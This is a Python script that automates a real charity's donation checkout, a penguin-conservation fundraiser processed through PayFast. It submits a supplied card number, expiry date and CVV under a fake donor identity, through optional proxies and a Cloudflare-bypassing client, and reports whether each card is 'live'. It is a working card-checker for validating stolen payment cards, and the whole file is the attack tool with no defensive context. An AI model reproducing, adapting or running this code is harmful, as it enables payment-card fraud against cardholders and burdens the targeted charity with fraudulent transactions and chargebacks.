import re, cloudscraper
scraper = cloudscraper.create_scraper()

def check_pf06(cc, mm, yy, cvv, proxy=None):
    """
    Returns (is_live: bool, message: str)
    Live = payment accepted (very rare), Approved = 3DS or valid card, else dead.
    """
    try:
        # Normalise month/year
        mm = mm.zfill(2)
        if len(yy) == 4:
            yy = yy[2:]

        fight = "https://dict.org.za/donate/"
        resp0 = scraper.get(fight, timeout=15,
                            proxies={"http": proxy, "https": proxy} if proxy else None)
        if resp0.status_code != 200:
            return False, "Failed to load donation page"

        tach = re.search(r'name="give-form-hash" value="([^"]+)"', resp0.text)
        if not tach:
            return False, "Could not find give-form-hash"
        tach = tach.group(1)

        params = {"payment-mode": "payfast", "form-id": "27824"}
        data = {
            "give-honeypot": "",
            "give-form-id-prefix": "27824-1",
            "give-form-id": "27824",
            "give-form-title": "Re-Build the African Penguin Population",
            "give-current-url": fight,
            "give-form-url": fight,
            "give-form-minimum": "10.00",
            "give-form-maximum": "999999.99",
            "give-form-hash": tach,
            "give-price-id": "custom",
            "give-cs-currency": "ZAR",
            "give-amount": "10.00",
            "give-cs-base-currency": "ZAR",
            "give-cs-exchange-rate": "0",
            "give-cs-form-currency": "ZAR",
            "give-radio-donation-level": "custom",
            "pbo_certificate": "No",
            "consultant": "",
            "give_tributes_type": "In honor of",
            "give_tributes_show_dedication": "no",
            "give_tributes_radio_type": "In honor of",
            "give_tributes_first_name": "",
            "give_tributes_last_name": "",
            "give_tributes_would_to": "none",
            "give_tributes_ecard_notify[recipient][personalized][]": "",
            "give_tributes_ecard_notify[recipient][first_name][]": "",
            "give_tributes_ecard_notify[recipient][last_name][]": "",
            "give_tributes_ecard_notify[recipient][email][]": "",
            "payment-mode": "payfast",
            "give_first": "Gron",
            "give_last": "Xone",
            "give_email": "G4onx@gmail.com",
            "give_agree_to_terms": "1",
            "give_mailchimp_signup": "on",
            "give_action": "purchase",
            "give-gateway": "payfast",
        }
        resp = scraper.post(fight, params=params, data=data, allow_redirects=False,
                            proxies={"http": proxy, "https": proxy} if proxy else None)
        if resp.status_code in (302, 303):
            payfast_url = resp.headers.get("Location")
        else:
            action_match = re.search(r'<form[^>]+action="(https://www\.payfast\.co\.za/eng/process[^"]+)"', resp.text)
            if action_match:
                payfast_url = action_match.group(1)
            else:
                script_match = re.search(r'window\.location\.href\s*=\s*"([^"]+)"', resp.text)
                if script_match:
                    payfast_url = script_match.group(1)
                else:
                    return False, "No PayFast URL found"

        resp2 = scraper.get(payfast_url, allow_redirects=True,
                            proxies={"http": proxy, "https": proxy} if proxy else None)
        if resp2.status_code != 200:
            return False, f"Engine page error {resp2.status_code}"

        uuid_match = re.search(r"/payment/([a-f0-9-]+)", resp2.url)
        if not uuid_match:
            return False, "UUID not found"
        uuid = uuid_match.group(1)

        cookies = {"pf_bid": resp2.cookies.get("pf_bid") if resp2.cookies else ""}
        headers = {
            "X-Requested-With": "XMLHttpRequest",
            "Referer": resp2.url,
            "Origin": "https://payment.payfast.io",
        }
        card_data = {
            "card_number": cc,
            "cardholder_name": "Gron Xone",
            "consent_check": "",
            "cvv": cvv,
            "expiry_month": mm,
            "expiry_year": yy,
            "captcha_version": "v0",
            "captcha_action": "checkout",
        }
        luffy = f"https://payment.payfast.io/eng/method/CreditCard/{uuid}/pay"
        resp3 = scraper.post(luffy, data=card_data, headers=headers, cookies=cookies,
                             proxies={"http": proxy, "https": proxy} if proxy else None)

        try:
            js = resp3.json()
            if js.get("data") and js["data"].get("secure3DSMethod"):
                return True, "3DSecure required"   # card is live
            else:
                # Any other response (decline, error, etc.)
                return False, resp3.text[:200]
        except:
            return False, resp3.text[:200]
    except Exception as e:
        return False, str(e)[:100]
